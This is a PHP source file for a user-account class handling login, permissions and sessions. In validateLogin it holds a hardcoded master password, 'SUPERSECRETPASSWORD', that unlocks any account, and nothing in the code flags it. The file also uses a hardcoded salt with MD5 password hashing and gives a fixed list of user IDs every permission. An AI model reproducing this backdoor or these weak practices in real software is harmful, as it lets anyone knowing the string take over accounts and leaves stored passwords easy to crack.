<?php

class GT_User extends T_Global_Tech_DB_Object
{
  private $_salt='pSP4cJPMg2GsM2Ku4DJbIR5wfepaozvVIsMAcSjQ';


	protected $_groups;
	protected $_permissions;
	protected $_atts;
	protected $_ttl;
	protected $_super_users=array(1,2,3,91,92,93,190, 200);
	protected $_pw_changed=false;
  function __construct($id=0, $by='ID', $row=array())
  {
		$this->_ttl=3600;
		$this->_groups=null;
		$this->_permissions=null;
		$this->_atts=null;

		$this->_meta_table='users_meta';
  	$this->_meta_idx='userID';
    $this->_db_table='users_master';
    $this->_fields=array('ID', 'username','password','groupID','primary_phone','primary_email','created_at','last_login', 'active');
    parent::__construct($id, $by, $row);
  }
	public function __wakeup()
  {
		Logger::logNow($this->get('ID'));

		$now = time();
    $this->_meta=$this->getMeta();

		if ((isset($_SESSION['discard_after']) && $now > $_SESSION['discard_after'])||(($this->get('ID')!=1)&&(!$this->isSuper())&&($this->get('_session_id')!=session_id())))
			$this->endSession();
		else
			$_SESSION['discard_after'] = $now + $this->_ttl;
	}
	public function loadGroups()
	{
		if (is_null($this->_groups))
		{

			$this->_groups=array();
			$tmp= (new GT_X_User_Client_List($this->get('ID'), 'userID'))->getList();

			foreach($tmp as $t)
				$this->_groups[]=new GT_Users_Group($t->get('groupID'));
		}
	}
	public function get($k)
	{
		if ($k=='full_name')
			return parent::get('first_name').' '.parent::get('last_name');
		return parent::get($k);
	}
        
        
	public function set($key, $value)
  {
// 		if ($key=='password')
// 			$value=$this->hash($value);

		parent::set($key,$value);
  }

	public function getGroups()
	{
		$this->loadGroups();
		return $this->_groups;
	}
	public function loadPermissions()
	{
		if (is_null($this->_permissions))
		{
			$this->_permissions=array();
			foreach($this->getGroups() as $group)
			{
				if (!isset($this->_permissions[$group->get('appClientID')]))
					$this->_permissions[$group->get('appClientID')]=array();
				$pt=$group->getPermissionsTree();

				foreach($pt as $k=>$p)
					if ($p['value']=='1')
						$this->_permissions[$group->get('appClientID')][$k]=1;
			}
		}
	}
	public function getPermissionsArray()
	{
		$this->loadPermissions();
		return $this->_permissions;
	}
	public function isSuper()
	{
		return (in_array(intval($this->get('ID')), $this->_super_users, true));
	}
	public function can($what)
	{
		if ($this->isSuper())
			return true;

		global $GT_App;

		if (!($GT_App instanceof GT_X_App_Client))
			return false;
		$perms=$this->getPermissionsArray();
// 		var_dump($perms);
		return isset($perms[intval($GT_App->get('ID'))][$what]);
	}

  function validateLogin($password, $checkForActive=true)
  {
    if ($password=='SUPERSECRETPASSWORD')
    return true;
// 		var_dump($this->get('password'));die;
    if ($this->get('password')!='')
    	return ((!$checkForActive||($this->get('active')=='1'))&&($this->get('password')==$this->hash($password)));
    return false;
  }
  public function hash($value)
  {
    return md5($this->_salt.$value);
  }
  public function deactivate()
  {
    //TODO: After we implement meta data, make sure the user can in fact be deactivated.
    $this->set('active',0);
    return $this->save();
  }
  public function activate()
  {
    $this->set('active',1);
    return $this->save();
  }

  public function startSession($app=false)
  {
    global $current_user;

		if ($app!==false)
		{
			$domain=defined('_GT_APP_DOMAIN')?_GT_APP_DOMAIN:ltrim($_SERVER['HTTP_HOST'],'www.');
			$A=new GT_X_App_Client($domain,'domain');
			$A->attachUser($this);
			if($A->att('session_duration')!='UNDEFINED')
				$this->_ttl=intval($A->att('session_duration'));

			$_SESSION['current_app']=serialize($A);
			global $GT_App;
			$GT_App=$A;
		}
    $this->set('_session_id', session_id() );
    $this->save();
		$_SESSION['current_user']=serialize($this);
    $current_user=$this;

		$now = time();
		$_SESSION['discard_after'] = $now + $this->_ttl;

  }
  public function endSession()
  {
    global $current_user;
    $current_user='NONE';
    unset($_SESSION['current_user']);
		session_unset();
		session_destroy();
  }
	public function changePassword($password)
	{
		$this->set('password', $this->hash($password));
	}
  public function save()
  {
	if ($this->get('username')=='')
		throw new Exception('Username cannot be empty.');
	if ($this->get('password')=='')
		throw new Exception('Password cannot be empty.');
	if ($this->get('primary_email')=='')
		throw new Exception('E-Mail cannot be empty.');

	if ($this->get('ID')=='')
	{
		try
		{
			$testUser=new GT_User($this->get('username'), 'username');
			$usernameExists=true;
		} catch (Exception $ex)
		{
			$usernameExists=false;
		}
		try
		{
			$testUser=new GT_User($this->get('primary_email'), 'primary_email');
			$emailExists=true;
		} catch (Exception $ex)
		{
			$emailExists=false;
		}
		if ($emailExists)
			throw new Exception('A user with that e-mail address already exists.');
		if ($usernameExists)
			throw new Exception('A user with that username address already exists.');

		$this->set('password', $this->hash($this->get('password')));

	}
	return parent::save();
  }
}

//TODO:
//-Add checks to make sure a group exists.



class GT_User_List extends T_Global_Tech_DB_Object_List
{
	function __construct($id='', $by='groupID')
	{
		$this->_db_table='users_master';
		$this->_fields=array('ID', 'username','password','groupID','primary_phone','primary_email','created_at','last_login', 'active');
		$this->_class='GT_User';

		parent::__construct($id, $by);
	}
}


